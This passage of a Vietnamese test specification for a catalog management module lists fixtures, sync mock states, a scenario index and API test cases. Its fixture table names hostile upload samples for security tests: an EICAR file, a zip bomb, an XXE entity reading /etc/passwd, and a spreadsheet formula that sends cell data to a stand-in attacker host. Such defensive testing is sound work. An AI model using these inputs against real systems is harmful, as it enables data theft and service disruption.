| F-AITA-U16 | `aita_legacy_utf16le.csv` | Khuôn Aita dạng CSV UTF-16 LE có BOM, phân cách tab như tệp xuất từ Excel "Unicode Text" | Ghi byte `FF FE` | TS-07-09 |
| F-AITA-U16BE | `aita_legacy_utf16be.csv` | Như trên, UTF-16 BE có BOM `FE FF` | | TS-07-09 |
| F-AITA-B4 | `aita_empty_b4.xlsx` | Khuôn Aita có ô C4 trống (tên thuộc tính trống) | | TS-07-09 |
| F-FAKE | `virus_rename.xlsx` | Tệp thực thi PE đổi đuôi `.xlsx` | Sao chép tệp mẫu EICAR bọc trong PE giả | TS-07-09, TS-07-28 |
| F-EICAR | `eicar.csv` | Chuỗi kiểm thử EICAR trong một ô CSV | Chuỗi chuẩn EICAR | TS-07-28 |
| F-ZIPBOMB | `bomb.xlsx` | xlsx có `sheet1.xml` nén tỉ lệ > 1:1000 (giải nén khoảng 5 GB) | Tạo XML lặp, nén deflate mức 9 | TS-07-09, TS-07-28 |
| F-XXE | `xxe.xlsx` | xlsx có `sharedStrings.xml` chứa khai báo thực thể ngoài trỏ `file:///etc/passwd` | Sửa XML thủ công | TS-07-28 |
| F-FORMULA | `formula.csv` | Ô `TEN` chứa `=HYPERLINK("http://attacker.invalid/?x="&A1,"Bấm")`, ô khác bắt đầu `+`, `-`, `@`, ký tự tab và CR đầu ô | Ghi trực tiếp | TS-07-09, TS-07-28 |
| F-MISSCOL | `missing_ten.csv` | Thiếu cột `TEN` | | TS-07-09 |
| F-LONG | `long_values.xlsx` | Giá trị `TEN` 2.000 ký tự; giá trị thuộc tính vượt `max_length` | | TS-07-08 |
| F-NEWCAT | `new_catalog.xlsx` | Khuôn chuẩn kèm sheet `ThuocTinh` khai báo thuộc tính cho chế độ CREATE_CATALOG | | TS-07-09 |
| F-DVHC-CONV | `ma_dvhc_cu.csv` | 1.000 mã ĐVHC cũ (giả lập và chính thức) cần chuyển | | TS-07-17 |

### 2.6. Dữ liệu cho đồng bộ quốc gia và di trú

WireMock giả lập dịch vụ DMDC quốc gia (qua PH-14) có các trạng thái kịch bản sau. Mỗi trạng thái trả một "phiên bản từ xa" (`remote_version`) khác nhau để kiểm thử phát hiện thay đổi.

| Trạng thái | Nội dung trả cho danh mục `GIOI_TINH` (và `DAN_TOC` khi ghi rõ) | Phân loại mong đợi |
|---|---|---|
| `BASE` | Giống hệt phiên bản hiện hành | Không đổi (`NO_CHANGE`) |
| `ADDED_5` | `DAN_TOC` thêm 5 mã `56`…`60` | Không phá vỡ |
| `RENAMED_2` | `GIOI_TINH` đổi tên 2 bản ghi | Không phá vỡ |
| `REMOVED_1` | `GIOI_TINH` mất mã `3` | Phá vỡ |
| `ATTR_TYPE_CHANGED` | `DAN_TOC` đổi kiểu thuộc tính `ten_khac` thành INTEGER | Phá vỡ |
| `HTTP_500` | Lỗi máy chủ | Lần chạy `FAILED`, ERR-07-028 |
| `TIMEOUT` | Trễ 65 giây (vượt thời gian chờ 30 giây) | Lần chạy `FAILED`, ERR-07-028 |
| `MALFORMED` | JSON thiếu trường bắt buộc | Lần chạy `FAILED` |

Dữ liệu di trú Aita được dựng trên MySQL 8 trong Testcontainers theo đúng lược đồ bốn bảng của hệ cũ (`category`, `category_fields`, `category_details`, `category_details_value`). Bộ mồi `aita_seed.sql` gồm: 40 danh mục, trong đó 1 danh mục có giá trị dài 2.000 ký tự (đúng giới hạn `varchar(2000)` cũ), 1 danh mục có hai bản ghi mã chỉ khác hoa thường và khoảng trắng đầu cuối (" ab01" và "AB01"), 1 danh mục có thuộc tính trạng thái ẩn (`status = 0`) và thứ tự `Order` không liên tục, 1 danh mục `Is_update = 1` (từ NGSP), 1 danh mục tên trùng tên một danh mục COMMON, 1 danh mục rỗng (không bản ghi), 1 danh mục có giá trị chứa ký tự điều khiển và emoji, tổng 12.345 bản ghi và 61.725 giá trị. Không có dữ liệu cá nhân thật trong bộ mồi.

### 2.7. Nguyên tắc dữ liệu

Mọi ca kiểm thử tạo dữ liệu mới phải dùng mã có tiền tố `TC{nnn}_` (ví dụ `TC015_DM_A`) để dọn dẹp được và không va chạm giữa các ca chạy song song. Ca kiểm thử chạy song song không được sửa danh mục dùng chung của bộ dữ liệu chuẩn; ca nào cần sửa (ví dụ phát hành `LOAI_HINH_TC`) phải chạy trong nhóm tuần tự `@Isolated` hoặc trên bản sao danh mục tạo bằng chế độ CREATE_CATALOG. Đồng hồ hệ thống trong IT được điều khiển bằng `Clock` tiêm vào (múi giờ `Asia/Ho_Chi_Minh`); ngày "hôm nay" mặc định của bộ dữ liệu là 2026-11-21.

## 3. Tổng quan kịch bản kiểm thử

### 3.1. Danh sách kịch bản

Các kịch bản được nhóm theo chức năng của phân hệ và theo các mối quan tâm xuyên suốt (đa tenant, phân quyền, bộ đệm, phi chức năng). Bảng sau là mục lục kịch bản; chi tiết mục tiêu, tiền điều kiện và test case của từng kịch bản ở mục 4 và mục 5.

| Mã | Tên kịch bản | FR chính | UC | Dải TC |
|---|---|---|---|---|
| TS-07-01 | Quản lý danh mục: liệt kê, xem, tạo, sửa, xóa, ngừng hiệu lực | 001–004, 009 | UC-07-01, UC-07-14 | TC-07-001…018 |
| TS-07-02 | Nhóm danh mục | 010 | — | TC-07-019…023 |
| TS-07-03 | Lược đồ thuộc tính động và phân cấp | 005–007 | UC-07-01 | TC-07-024…038 |
| TS-07-04 | Nguồn danh mục, quyền cập nhật, mở rộng HYBRID | 008, 048 | UC-07-17 | TC-07-039…046 |
| TS-07-05 | Bản nháp và bản ghi | 011–013, 017–019 | UC-07-02 | TC-07-047…066 |
| TS-07-06 | So sánh phiên bản và phân loại thay đổi phá vỡ | 014 | UC-07-06 | TC-07-067…071 |
| TS-07-07 | Trình duyệt, duyệt, từ chối, phát hành (máy trạng thái phiên bản) | 015, 016 | UC-07-06, UC-07-07 | TC-07-072…092 |
| TS-07-08 | Tệp mẫu và nhập tệp theo chế độ | 020, 021 | UC-07-03 | TC-07-093…110 |
| TS-07-09 | Nhập tệp: định dạng, mã hóa, khuôn Aita, tạo danh mục từ tệp, tệp bất thường | 021, 022 | UC-07-04 | TC-07-111…124 |
| TS-07-10 | Nhập bản ghi qua API theo lô, idempotency | 023 | UC-07-05 | TC-07-125…130 |
| TS-07-11 | Xuất danh mục và lịch sử tác vụ | 024, 025 | UC-07-08 | TC-07-131…137 |
| TS-07-12 | Tra cứu khai thác qua API | 026–031, 033 | UC-07-09 | TC-07-138…156 |
| TS-07-13 | Truy vấn có cấu trúc (DSL) | 032 | UC-07-10 | TC-07-157…170 |
| TS-07-14 | Sự kiện và outbox | 034 | — | TC-07-171…176 |
| TS-07-15 | Đồng bộ danh mục quốc gia (máy trạng thái lần đồng bộ) | 035–039 | UC-07-11 | TC-07-177…190 |
| TS-07-16 | Hệ thống mã, ánh xạ và chuyển mã | 040–043 | UC-07-13 | TC-07-191…199 |
| TS-07-17 | ĐVHC: sắp xếp, chuyển mã, tra theo thời điểm, dòng lịch sử | 044–047 | UC-07-12 | TC-07-200…213 |
| TS-07-18 | Danh mục COMMON, PLATFORM và nạp gói nền | 048, 049 | UC-07-15 | TC-07-214…219 |
| TS-07-19 | Rò rỉ chéo tenant trên mọi nhóm API | FR-00-011 | — | TC-07-220…233 |
| TS-07-20 | Ma trận phân quyền PERM-07 × vai trò, bốn mắt, phạm vi tổ chức, scope máy | FR-00-071, D02-08 | — | TC-07-234…255 |
| TS-07-21 | Kiểm toán và lịch sử | 050 | — | TC-07-256…259 |
| TS-07-22 | Di trú dữ liệu Aita | 051 | UC-07-16 | TC-07-260…267 |
| TS-07-23 | Khai thác danh mục RESTRICTED | 052 | — | TC-07-268…271 |
| TS-07-24 | Tham số PH-07 theo tenant | 053 | — | TC-07-272…274 |
| TS-07-25 | Bộ đệm, ảnh chụp và chịu lỗi | 028, NFR-07-009, 010 | — | TC-07-275…282 |
| TS-07-26 | Giao diện E2E và yêu cầu dùng chung FR-00 | 018, FR-00-0xx | Nhiều | TC-07-283…292 |
| TS-07-27 | Hiệu năng (k6) | NFR-07-001…009, 011, 012 | — | TC-07-293…303 |
| TS-07-28 | Bảo mật (ASVS) | — | — | TC-07-304…315 |
| TS-07-29 | Khả năng truy cập | FR-00, WCAG 2.2 AA | — | TC-07-316…320 |
| TS-07-30 | Nghiệm thu người dùng (UAT) tương đương hệ Aita | LGC-DMDC | — | UAT-01…15 (mục 7) |

### 3.2. Máy trạng thái được kiểm thử

PH-07 có năm máy trạng thái. Kiểm thử phủ mọi chuyển trạng thái hợp lệ và các chuyển không hợp lệ có rủi ro nghiệp vụ cao (sửa phiên bản đã phát hành, commit tác vụ đã hết hạn, xác nhận lần đồng bộ đã áp dụng). Bảng sau tổng hợp chuyển trạng thái và test case phủ; trạng thái tác vụ nhập theo FRS §4.14: `UPLOADED` → `SCANNING` → `PARSING` → `VALIDATING` → `VALIDATED` → `COMMITTING` → `COMMITTED` cùng các trạng thái kết thúc `FAILED`, `CANCELLED`, `EXPIRED`.

> **Câu hỏi mở Q07-75 (đã đóng 25/11/2026):** Tên trạng thái tác vụ nhập được chốt theo FRS §4.14 và dùng thống nhất ở D03-03-PH07 (`ck_import_job_status`), OpenAPI (`ImportJobStatus`) và D03-06-PH07. Các ca TC-07-093…124 đã dùng tên mới.

| Máy trạng thái | Chuyển | Hợp lệ | Test case |
|---|---|---|---|
| Phiên bản | (tạo) → `DRAFT` | Có | TC-07-047 |
| Phiên bản | `DRAFT` → `IN_REVIEW` (submit) | Có | TC-07-072 |
| Phiên bản | `IN_REVIEW` → `APPROVED` (approve) | Có | TC-07-073 |
| Phiên bản | `APPROVED` → `PUBLISHED` (publish) | Có | TC-07-074 |
| Phiên bản | `IN_REVIEW` → `DRAFT` (reject) | Có | TC-07-076 |
| Phiên bản | `IN_REVIEW` → `DRAFT` (rút lại, `WITHDRAW`) | Có, chỉ người trình | TC-07-256 |
| Phiên bản | `APPROVED` → `IN_REVIEW` (thu hồi duyệt, `UNAPPROVE`) | Có, người duyệt | TC-07-241 |
| Phiên bản | `DRAFT` → `PUBLISHED` (phát hành trực tiếp) | Có khi `require_approval = false` và không vi phạm BR-07-012 | TC-07-084 |
| Phiên bản | `DRAFT` → `DISCARDED` | Có | TC-07-064 |
| Phiên bản | `PUBLISHED` → sửa bất kỳ | Không | TC-07-079, TC-07-080 |
| Phiên bản | `IN_REVIEW`/`APPROVED` → sửa bản ghi | Không | TC-07-081 |
| Phiên bản | `DISCARDED` → submit | Không | TC-07-082 |
| Phiên bản | `DRAFT` → approve (bỏ qua submit) khi `require_approval = true` | Không | TC-07-083 |
| Phiên bản | `IN_REVIEW`/`APPROVED`/`PUBLISHED` → hủy | Không | TC-07-065 |
| Danh mục | (tạo) → `DRAFT` | Có | TC-07-005 |
| Danh mục | `DRAFT` → `ACTIVE` (phát hành lần đầu) | Có | TC-07-075 |
| Danh mục | `ACTIVE` → `RETIRED` | Có | TC-07-013 |
| Danh mục | `DRAFT` → xóa mềm | Có | TC-07-011 |
| Danh mục | `ACTIVE` → xóa | Không | TC-07-012 |
| Danh mục | `RETIRED` → tạo bản nháp mới | Không | TC-07-016 |
| Danh mục | `DRAFT` → retire | Không | TC-07-017 |
| Bản ghi | (thêm) → `ACTIVE` | Có | TC-07-050 |
| Bản ghi | `ACTIVE` → `DEPRECATED` (kèm mã thay thế) | Có | TC-07-055 |
| Bản ghi | `DEPRECATED` → `ACTIVE` (khôi phục trong bản nháp mới) | Có | TC-07-057 |
| Bản ghi | đã phát hành → xóa | Không | TC-07-058 |
| Tác vụ nhập | `UPLOADED` → `SCANNING` → `PARSING` → `VALIDATING` → `VALIDATED` | Có | TC-07-095 |
| Tác vụ nhập | `VALIDATED` → `COMMITTING` → `COMMITTED` | Có | TC-07-095 |
| Tác vụ nhập | `SCANNING` → `FAILED` (tệp nhiễm) | Có | TC-07-119 |
| Tác vụ nhập | `PARSING` → `FAILED` (tệp hỏng) | Có | TC-07-115 |
| Tác vụ nhập | `VALIDATED` → `CANCELLED` | Có | TC-07-107 |
| Tác vụ nhập | `VALIDATED` → `EXPIRED` (sau 24 giờ) | Có | TC-07-104 |
| Tác vụ nhập | `COMMITTED`/`EXPIRED`/`CANCELLED` → commit | Không | TC-07-104, TC-07-106, TC-07-108 |
| Tác vụ nhập | `COMMITTING` → `FAILED` (lỗi giữa chừng, hoàn tác) | Có | TC-07-110 |
| Lần đồng bộ | `RUNNING` → `NO_CHANGE` | Có | TC-07-179 |
| Lần đồng bộ | `RUNNING` → `APPLIED` (tự áp dụng) | Có | TC-07-180 |
| Lần đồng bộ | `RUNNING` → `PENDING_CONFIRMATION` | Có | TC-07-182 |
| Lần đồng bộ | `PENDING_CONFIRMATION` → `APPLIED` (accept) | Có | TC-07-183 |
| Lần đồng bộ | `PENDING_CONFIRMATION` → `REJECTED` | Có | TC-07-184 |
| Lần đồng bộ | `RUNNING` → `FAILED` | Có | TC-07-186 |
| Lần đồng bộ | `APPLIED`/`REJECTED`/`NO_CHANGE` → accept/reject | Không | TC-07-185 |

## 4. Kịch bản và test case chức năng

### TS-07-01 · Quản lý danh mục: liệt kê, xem, tạo, sửa, xóa, ngừng hiệu lực

**Mục tiêu.** Kịch bản này xác nhận vòng đời của thực thể danh mục (`catalog`) từ khi tạo tới khi xóa (nếu chưa phát hành) hoặc ngừng hiệu lực (nếu đã phát hành), cùng các màn liệt kê và xem chi tiết. Đây là nhóm chức năng thay thế trực tiếp các mục LGC-DMDC-001, 003, 004, 009, 012 của hệ Aita nên được ưu tiên cao.

**Phủ.** FR-07-001, 002, 003, 004, 009; BR-07-001, 020; UC-07-01, UC-07-14; API-07-001…006; UI-07-01, 02, 03; ERR-07-001, 002, 004, 018, 022, 031, 032; EVT-07-01, 02, 03.

**Tiền điều kiện chung.** Bộ dữ liệu chuẩn mục 2 đã nạp; người dùng U-T68-TA, U-T68-DS-NV đăng nhập được; đồng hồ hệ thống 2026-11-21.

#### TC-07-001 · Liệt kê danh mục có lọc, sắp xếp và đếm số lượng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-001 · API-07-001 · UI-07-01 · LGC-DMDC-001
- **Tiền điều kiện / dữ liệu** T68 có 9 danh mục riêng (CAT-DT68, CAT-LH, CAT-MUC, CAT-NHAP, CAT-RES, CAT-REF, CAT-BIG và 2 danh mục khác); COMMON có 4 danh mục. Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs?page=0&size=20&sort=code,asc`.
  2. Gọi `GET /catalogs?sourceType=LOCAL&status=ACTIVE`.
  3. Gọi `GET /catalogs?q=loai hinh` (không dấu).
  4. Gọi `GET /catalogs?classification=RESTRICTED`.
- **Mong đợi** Bước 1 trả `200`, `totalElements` = 13 (9 của T68 cộng 4 COMMON hiển thị kèm nhãn nguồn `COMMON`), danh sách sắp theo mã tăng dần, không có danh mục nào của T01 hoặc đã xóa mềm. Bước 2 chỉ trả danh mục LOCAL đang ACTIVE (không có `DM_THU_NGHIEM` vì đang DRAFT). Bước 3 trả `LOAI_HINH_TC` (tìm không dấu theo FR-00-020). Bước 4 trả đúng `TRAM_QUAN_TRAC`. Mỗi phần tử có `code`, `name`, `sourceType`, `status`, `classification`, `currentVersionNo`, `itemCount`. KT: không. EVT: không.

#### TC-07-002 · Liệt kê với tham số phân trang hoặc bộ lọc không hợp lệ
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-001 · API-07-001 · FR-00-021
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs?size=200` (biên trên).
  2. Gọi `GET /catalogs?size=201`.
  3. Gọi `GET /catalogs?status=ARCHIVED` (giá trị không có trong miền).
  4. Gọi `GET /catalogs?sort=drop_table,asc` (trường sắp xếp không cho phép).
- **Mong đợi** Bước 1 trả `200`. Bước 2, 3, 4 trả `400` dạng `application/problem+json`, có trường `errors` chỉ rõ tham số sai, không lộ thông điệp SQL. KT: không.

#### TC-07-003 · Xem chi tiết danh mục phân cấp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-002 · API-07-003, 011, 022, 026 · UI-07-02 · LGC-DMDC-003
- **Tiền điều kiện / dữ liệu** CAT-LH đã phát hành v1; người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/versions`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/versions/current/attributes`.
  4. Gọi `GET /catalogs/LOAI_HINH_TC/versions/current/items?page=0&size=50`.
  5. Trên giao diện, mở UI-07-02 của danh mục, lần lượt bấm các tab Tổng quan, Bản ghi, Thuộc tính, Phiên bản.
- **Mong đợi** Bước 1 trả `200` với `isHierarchical = true`, `maxDepth = 3`, `levelNames` = `["Khối","Loại","Phân loại"]`, `ETag` khớp `version`. Bước 2 liệt kê v1 `PUBLISHED` có nhãn tính toán "Đang hiệu lực". Bước 3 trả 5 thuộc tính theo `sortOrder`. Bước 4 trả 39 bản ghi, mỗi bản ghi có `depth`, `path`, `levelName`. Giao diện hiển thị đúng số liệu, tab Ánh xạ, Đồng bộ chỉ hiện khi có dữ liệu hoặc quyền tương ứng. KT: không.

#### TC-07-004 · Xem chi tiết danh mục không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-002 · API-07-003 · ERR-07-001
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs/KHONG_TON_TAI`.
  2. Gọi `GET /catalogs/DM_DA_XOA` (danh mục đã bị xóa mềm trước đó ở TC-07-011).
- **Mong đợi** Cả hai trả `404`, `code` = `ERR-07-001`, thông điệp tiếng Việt "Không tìm thấy danh mục", có `traceId`. KT: không.

#### TC-07-005 · Tạo danh mục thủ công kèm thuộc tính ban đầu
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-003, 005, 007 · BR-07-001 · API-07-002 · UI-07-03 · UC-07-01 · EVT-07-01 · LGC-DMDC-004
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-DS-NV; mã `TC005_CAP_DO`.
- **Bước**
  1. Gọi `POST /catalogs` với `Idempotency-Key: k-005`, thân `{"code":"tc005_cap_do","name":"Cấp độ hồ sơ","sourceType":"LOCAL","classification":"PUBLIC","isHierarchical":false,"requireApproval":true,"ownerOrgId":"<ORG-SNV>","attributes":[{"code":"mo_ta","label":"Mô tả","dataType":"TEXT"},{"code":"so_ngay","label":"Số ngày xử lý","dataType":"INTEGER","minValue":0,"queryable":true}]}`.
  2. Gọi `GET /catalogs/TC005_CAP_DO` và `GET /catalogs/TC005_CAP_DO/versions`.
  3. Đọc bảng `ph07_rdm.outbox` và topic `t68.rdm.catalog.created.v1`.
- **Mong đợi** Bước 1 trả `201`, header `Location` trỏ `/catalogs/TC005_CAP_DO`, mã được chuẩn hóa thành chữ hoa. Bước 2 cho `status = DRAFT`, có đúng một phiên bản v1 `DRAFT`, 2 thuộc tính, `tenantId` = `T68` (lấy từ token). Bước 3: đúng một sự kiện EVT-07-01 dạng CloudEvents (`type` = `vn.datahub.rdm.catalog.created.v1`, `source`, `id` duy nhất, `tenantid` = `t68`). KT: có (CREATE catalog, giá trị sau).

#### TC-07-006 · Tạo danh mục trùng mã trong cùng tenant
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-003 · BR-07-001 · API-07-002 · ERR-07-002
- **Tiền điều kiện / dữ liệu** CAT-LH tồn tại trong T68; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs` với `code` = `loai_hinh_tc` (khác hoa thường), `Idempotency-Key` mới.
- **Mong đợi** `409`, `ERR-07-002`. Không có bản ghi `catalog` mới. EVT: không. KT: có (CREATE catalog, kết quả thất bại) theo FR-00-040 nếu chính sách kiểm toán ghi cả thao tác bị từ chối nghiệp vụ.

#### TC-07-007 · Tạo danh mục trùng mã danh mục COMMON đang ACTIVE
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-003 · BR-07-001 · ERR-07-002
- **Tiền điều kiện / dữ liệu** COMMON có `GIOI_TINH` ACTIVE; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs` với `code` = `GIOI_TINH`.
  2. Gọi `POST /catalogs` với `code` = `TC007_GIOI_TINH_RIENG`.
- **Mong đợi** Bước 1 trả `409` `ERR-07-002` (chi tiết nêu trùng với danh mục dùng chung). Bước 2 trả `201`. EVT: chỉ một EVT-07-01 cho bước 2.

#### TC-07-008 · Gửi lại yêu cầu tạo với cùng Idempotency-Key và cùng nội dung
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-003 · API-07-002 · D03-01 §7.2
- **Tiền điều kiện / dữ liệu** Đã chạy TC-07-005 với `k-005`.
- **Bước**
  1. Gửi lại nguyên văn yêu cầu bước 1 của TC-07-005 trong vòng 24 giờ.
- **Mong đợi** `201` (hoặc `200` kèm header `Idempotency-Replayed: true` theo D03-04), thân phản hồi giống lần đầu; không có danh mục thứ hai; không có EVT-07-01 thứ hai; không có bản ghi kiểm toán thứ hai.

#### TC-07-009 · Dùng lại Idempotency-Key với nội dung khác
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-003 · ERR-07-022
- **Tiền điều kiện / dữ liệu** Đã chạy TC-07-005 với `k-005`.
- **Bước**
  1. Gọi `POST /catalogs` với `Idempotency-Key: k-005` nhưng `name` = "Tên khác".
- **Mong đợi** `409`, `ERR-07-022`. Danh mục `TC005_CAP_DO` giữ nguyên tên. EVT: không.

#### TC-07-010 · Cập nhật thông tin danh mục với If-Match đúng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-004 · API-07-004 · UI-07-03 · EVT-07-02 · LGC-DMDC-009
- **Tiền điều kiện / dữ liệu** CAT-LH ACTIVE, `ETag` = `"7"`; người gọi U-T68-DS-NV (cùng tổ chức chủ quản).
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC`, lấy `ETag`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC` với `If-Match: "7"`, thân `{"name":"Loại hình tổ chức (sửa)","description":"Mô tả mới"}`.
- **Mong đợi** `200`, `ETag` mới `"8"`; tên mới hiển thị ở UI-07-01; nội dung phiên bản đã phát hành không đổi (tên danh mục là thông tin của thực thể danh mục, không thuộc ảnh chụp phiên bản). EVT-07-02 phát một lần với danh sách trường đổi. KT: có (UPDATE catalog, giá trị trước và sau).

#### TC-07-011 · Xóa danh mục chưa từng phát hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-009 · API-07-005 · UI-07-02 · UC-07-14 · LGC-DMDC-012 · FR-00-050, 051
- **Tiền điều kiện / dữ liệu** CAT-NHAP (`DM_THU_NGHIEM`, `DRAFT`); người gọi U-T68-TA.
- **Bước**
  1. Trên UI-07-02 bấm "Xóa danh mục"; hộp xác nhận hiện, nhập lại mã danh mục để xác nhận.
  2. Gọi tương đương `DELETE /catalogs/DM_THU_NGHIEM` với `If-Match`.
  3. Gọi `GET /catalogs/DM_THU_NGHIEM`.
- **Mong đợi** Bước 2 trả `204`. `catalog.deleted_at` có giá trị, phiên bản nháp chuyển `DISCARDED`. Bước 3 trả `404` `ERR-07-001`. Mã `DM_THU_NGHIEM` có thể dùng lại để tạo danh mục mới (chỉ mục duy nhất loại trừ bản ghi đã xóa mềm). KT: có (DELETE catalog). EVT: không có EVT-07-03 (xóa danh mục chưa phát hành không phát sự kiện cho bên khai thác).

#### TC-07-012 · Không cho xóa danh mục đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-009 · API-07-005 · ERR-07-048
- **Tiền điều kiện / dữ liệu** CAT-MUC ACTIVE; người gọi U-T68-TA.
- **Bước**
  1. Gọi `DELETE /catalogs/MUC_DO_DVC` với `If-Match` đúng.
- **Mong đợi** `409`, `ERR-07-048` với chi tiết gợi ý "Danh mục đã phát hành, hãy dùng chức năng ngừng hiệu lực". Danh mục giữ nguyên. Trên UI-07-02 nút "Xóa" không hiển thị với danh mục ACTIVE (FR-00-053).

> **Câu hỏi mở Q07-76 (đã đóng ngày 25/11/2026):** Mã riêng cho "danh mục không ở trạng thái cho phép thao tác" là `ERR-07-048` (D03-04-PH07 §6); TC-07-012 và TC-07-017 đã cập nhật.

#### TC-07-013 · Ngừng hiệu lực danh mục đã phát hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-009 · API-07-006 · UC-07-14 · EVT-07-03 · LGC-DMDC-012
- **Tiền điều kiện / dữ liệu** Danh mục `TC013_DM` ACTIVE (tạo và phát hành trong bước chuẩn bị), không bị tham chiếu; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/TC013_DM:retire` với thân `{"reason":"Hết căn cứ pháp lý","effectiveDate":"2026-12-01"}`.
  2. Gọi `GET /catalogs/TC013_DM`.
- **Mong đợi** Bước 1 trả `200`; `status = RETIRED`; phiên bản hiện hành có `effective_to` = 2026-12-01. EVT-07-03 phát một lần (có `reason`, `effectiveDate`). Con trỏ phiên bản hiệu lực trong bộ đệm bị vô hiệu. KT: có (RETIRE catalog, lý do).

#### TC-07-014 · Không ngừng hiệu lực danh mục đang được tham chiếu
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-009 · BR-07-020 · ERR-07-032
- **Tiền điều kiện / dữ liệu** CAT-REF ACTIVE có thuộc tính CATALOG_REF trỏ `LOAI_HINH_TC`; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC:retire` với lý do hợp lệ.
- **Mong đợi** `409`, `ERR-07-032`, chi tiết liệt kê danh mục tham chiếu `LINH_VUC_TTHC`. `LOAI_HINH_TC` vẫn ACTIVE. EVT: không.

#### TC-07-015 · Tra cứu danh mục đã ngừng hiệu lực
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-009, 026 · ERR-07-031 · BR-07-008
- **Tiền điều kiện / dữ liệu** `TC013_DM` RETIRED từ 2026-12-01; đồng hồ đặt 2026-12-02; người gọi APP-T68-READ.
- **Bước**
  1. Gọi `GET /catalogs/TC013_DM/items/A01`.
  2. Gọi `GET /catalogs/TC013_DM/items/A01?at=2026-11-25`.
- **Mong đợi** Bước 1 trả `410`, `ERR-07-031`. Bước 2 trả `200` với bản ghi theo phiên bản hiệu lực tại 2026-11-25 (dữ liệu lịch sử vẫn tra được).

#### TC-07-016 · Không tạo bản nháp mới cho danh mục RETIRED
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-009, 011 · API-07-012 · ERR-07-031
- **Tiền điều kiện / dữ liệu** `TC013_DM` RETIRED; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs/TC013_DM/versions`.
- **Mong đợi** `410`, `ERR-07-031`. Không có phiên bản mới.

#### TC-07-017 · Không ngừng hiệu lực danh mục chưa phát hành
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-009 · API-07-006 · ERR-07-048
- **Tiền điều kiện / dữ liệu** Danh mục `TC017_DM` DRAFT; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/TC017_DM:retire`.
- **Mong đợi** `409`, `ERR-07-048`, gợi ý dùng xóa. Trạng thái giữ `DRAFT`.

#### TC-07-018 · Cập nhật thông tin danh mục với ETag cũ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-004 · API-07-004 · ERR-07-018, 040, 004 · BR-07-040 · FR-00-052
- **Tiền điều kiện / dữ liệu** CAT-LH có `ETag` `"8"` sau TC-07-010; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC` với `If-Match: "7"`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC` không có `If-Match`.
  3. Trên giao diện: mở UI-07-03 ở hai tab trình duyệt, lưu tab 1, rồi lưu tab 2.
  4. Gọi `PATCH /catalogs/LOAI_HINH_TC` với `If-Match` đúng và `code = LOAI_HINH_TC2` (danh mục đã phát hành).
- **Mong đợi** Bước 1 trả `412`, `ERR-07-018`. Bước 2 trả `400` `ERR-07-040` (quy ước thiếu `If-Match` của D03-04-PH07 §6). Bước 4 trả `409` `ERR-07-004`, mã danh mục không đổi (BR-07-040). Bước 3: tab 2 hiển thị hộp thoại xung đột có khác biệt, cho chọn "Tải lại" hoặc "Ghi đè" (FR-00-052). Dữ liệu không bị ghi đè âm thầm.

### TS-07-02 · Nhóm danh mục

**Mục tiêu.** Xác nhận cây nhóm danh mục (EN-07-01) hiển thị ở khung trái UI-07-01 được tạo, sửa, xóa đúng và không cho xóa nhóm còn danh mục. Đây là chức năng mới mức S, không có trong hệ Aita.

**Phủ.** FR-07-010; API-07-007…010; UI-07-01; ERR-07-037.

**Tiền điều kiện chung.** T68 có nhóm `HANH_CHINH` chứa CAT-LH, CAT-MUC và nhóm con `HANH_CHINH.TO_CHUC` rỗng. Người gọi U-T68-TA.

#### TC-07-019 · Tạo nhóm con và xem cây nhóm
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API, E2E
- **Truy vết** FR-07-010 · API-07-007, 008 · UI-07-01
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `POST /catalog-groups` thân `{"code":"TC019_NHOM","name":"Nhóm thử","parentId":"<id HANH_CHINH>","sortOrder":5}`.
